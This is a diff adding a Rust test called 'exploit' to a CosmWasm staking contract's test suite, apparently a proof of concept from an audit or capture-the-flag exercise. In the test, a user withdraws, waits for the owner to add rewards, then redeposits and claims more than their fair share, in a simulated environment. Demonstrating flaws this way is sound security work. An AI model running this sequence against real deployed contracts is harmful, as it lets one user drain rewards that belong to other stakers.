@@ -410,4 +410,92 @@ pub mod tests {
         assert_eq!(user_info.staked_amount, Uint128::zero());
         assert_eq!(user_info.pending_rewards, Uint128::zero());
     }
+    
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // new user2 join
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // sandwich
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw {
+                amount: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // owner increases reward
+        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(OWNER),
+            contract_addr.clone(),
+            &ExecuteMsg::IncreaseReward {},
+            &[coin(10_000, REWARD_DENOM)],
+        )
+        .unwrap();
+
+        let user_info_before: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER2.to_string(),
+                },
+            )
+            .unwrap();
+
+        // sandwich
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        let user_info_after: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER2.to_string(),
+                },
+            )
+            .unwrap();
+        // our shares should only be 5_000
+        assert_eq!(user_info_after.pending_rewards, Uint128::new(10_000));
+        let didincrease: bool = user_info_after.pending_rewards > user_info_before.pending_rewards;
+        assert_eq!(didincrease, true);
+
+        // user2 claim rewards
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap();
+
+        // user2 receives reward denom
+        let balance = app
+            .wrap()
+            .query_balance(USER2.to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+
+        assert_eq!(balance, user_info_after.pending_rewards);
+
+    }
 }
